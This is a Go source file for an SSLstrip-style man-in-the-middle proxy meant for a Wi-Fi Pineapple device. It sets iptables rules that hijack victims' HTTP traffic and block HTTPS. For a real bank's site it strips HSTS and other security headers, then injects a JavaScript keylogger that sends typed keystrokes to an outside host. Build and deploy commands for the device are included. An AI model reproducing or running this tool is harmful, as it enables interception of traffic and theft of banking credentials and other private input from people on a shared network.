package main

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"strconv"
	"strings"
	"time"
  "os/exec"
)



// Derived from https://github.com/hak5/wifipineapple-modules/blob/master/HTTPProxy/api/module.php#L148

func execcmds(cmds []string){
  for _, cmd := range cmds {
    args := strings.Fields(cmd)
    _, _ = exec.Command(args[0], args[1:]...).Output()
  }
}

func startiptables() {
  // This should be on anyway
  ioutil.WriteFile("/proc/sys/net/ipv4/ip_forward", []byte("1"), 0644)

  // To turn on forwarding:
  execcmds([]string{
    "iptables -t nat -A PREROUTING -s 172.16.42.0/24 -p tcp --dport 80  -j DNAT --to-destination 172.16.42.1:8080",
    "iptables -A INPUT -p tcp --dport 53 -j ACCEPT",
    "iptables -I INPUT -p tcp --dport 443 -j DROP",
  })
}

func stopiptables() {
  // To turn off forwarding:
  execcmds([]string{
    "iptables -t nat -D PREROUTING -s 172.16.42.0/24 -p tcp --dport 80  -j DNAT --to-destination 172.16.42.1:8080",
    "iptables -D INPUT -p tcp --dport 53 -j ACCEPT",
    "iptables -D INPUT -p tcp --dport 443 -j DROP",
  })
}

// How to check if running: iptables -t nat -L PREROUTING | grep 172.16.42.1



// Cross-compilation for Pineapple MIPS
// GOOS=linux GOARCH=mips GOMIPS=softfloat go build -a sslstrip.go && scp sslstrip root@172.16.42.1:/sd

func forwardRequest(client *http.Client, req *http.Request) (*http.Response, error) {
	// https://stackoverflow.com/a/34725635/1181387
	body, err := ioutil.ReadAll(req.Body)
	if err != nil {
		return nil, err
	}
	req.Body = ioutil.NopCloser(bytes.NewReader(body))

	var url string
	if strings.Contains(req.RequestURI, "https://") || strings.Contains(req.RequestURI, "http://") {
		url = req.RequestURI
	} else {
		url = fmt.Sprintf("%s://%s%s", "http", req.Host, req.RequestURI)
	}

	proxyReq, err := http.NewRequest(req.Method, url, bytes.NewReader(body))
	proxyReq.Header = make(http.Header)
	for h, val := range req.Header {
		proxyReq.Header[h] = val
	}

	//log.Println(req)
	//log.Println(proxyReq)
	res, err := client.Do(proxyReq)
	if err != nil {
		return nil, err
	}
	return res, nil
}

var script = []byte(`
<script>
//alert("pwned");
(function(){
  var acc = "";
  var timeout = null;
  window.onkeypress = function(e){
    var e = e || window.event;
    key = e.keyCode || e.charCode;
    acc += String.fromCharCode(key);
    clearTimeout(timeout);
    timeout = setTimeout(function(){
      if(acc != ""){
        new Image().src = 'https://keylogger.clive.io/pineapple['+encodeURIComponent(acc) + ']';
        acc = "";
      }
    }, 1000);
  }
})();
</script>
`)

func proxyHandler (w http.ResponseWriter, req *http.Request) {
	client := &http.Client{ Timeout: time.Second * 10 }
  res, err := forwardRequest(client, req)
  if err != nil {
    w.WriteHeader(500)
    log.Println(err)
    return
  }
  body, err := ioutil.ReadAll(res.Body)
  defer res.Body.Close()

  if err != nil {
    w.WriteHeader(500)
    log.Println(err)
    return
  }
  for h, val := range res.Header {
    w.Header().Set(h, val[0])
  }
  //log.Println(req)
  if req.Host == "www.hsbc.ca" {
    w.Header().Set("Strict-Transport-Security", "")
    w.Header().Set("Access-Control-Allow-Origin", "")
    w.Header().Set("X-Frame-Options", "")
    if strings.Contains(w.Header().Get("Content-Type"), "text/html") {
      w.Header().Set("If-Modified-Since", "")
      w.Header().Set("Last-Modified", "")
      w.Header().Set("Expires", "")
      w.Header().Set("Cache-Control", "")
      log.Println(req.RequestURI)
      oldlength, err := strconv.Atoi(w.Header().Get("Content-Length"))
      if err == nil {
        w.Header().Set("Content-Length", strconv.Itoa(oldlength+len(script)))
      }
      index := bytes.Index(body, []byte("</body>"))
      if index == -1 {
        log.Println("WARNING: can't find </body>, not injecting script:")
        log.Println("???" + string(body) + "???")
      } else {
        body = append(body[:index], append(script, body[index:]...)...)
      }
    }
  }
  w.Write(body)
}

func main() {
	startiptables()
  defer stopiptables()

	http.HandleFunc("/", proxyHandler)

	log.Println("About to listen on :8080")
	log.Fatal(http.ListenAndServe(":8080", nil))
}
